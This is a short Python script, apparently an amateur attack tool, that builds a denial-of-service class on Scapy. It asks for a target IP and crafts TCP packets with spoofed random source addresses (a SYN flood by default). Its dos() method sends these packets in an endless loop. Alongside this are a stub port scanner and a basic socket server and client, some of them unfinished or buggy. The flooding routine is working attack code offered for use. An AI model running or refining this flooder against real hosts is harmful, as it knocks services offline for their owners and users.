from scapy.all import ICMP, ARP, IP, UDP, TCP, Ether, RandShort, RandIP, send
from threading import Thread
import socket

class PortScanner:
    def __init__(self):
        pass

class Ddos:
    def __init__(self):
        self.ip = input("\n\n   [*]Enter target ip: ")
        flags = input("\n\n   [*]Enter flags(Syn flood by default): ")
        self.packet = IP(dst=self.ip, src=RandIP())/TCP(flags=flags, dport=RandShort(), sport=RandShort())
        print("[*]packet has been initialized")

    def StartServer(self):
        portnum = int(input("\n\n   [*]What port to listen: "))
        NumOfPeople = int(input("\n\n   [*]How many people are allowed to enter: "))

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("\n   [*]Socket has been initialized")

        self.sock.bind(("127.0.0.1", portnum))
        print("\n   [*]Socket has been bound")

        self.sock.listen(NumOfPeople)
        print("\n   [*]Server is Listening...")

        while True:
            client, adrr = self.sock.accept()
            print(adrr[0])
            thrd = Thread(target=self.OnClientJoin, args=(client,))
            thrd.start()

    def OnClientJoin(self, client: socket.socket):
        pass

    def ClientMode(self):
        PortNumber = int(input("\n\n   [*]Port number to connect: "))

        self.sock.connect((self.ip, PortNumber))

        while True:
            buffer = self.sock.recv(4096)
            if buffer == b'bye' or buffer == b'':
                break
            print(f"   {buffer.decode()}")

        self.sock.close()


    def dos(self):
        send(self.packet, loop=1, verbose=1)

    def __SpamDos(self, massge):
        while massge != "end":
            send(self.packet, verbose=False, loop=False)
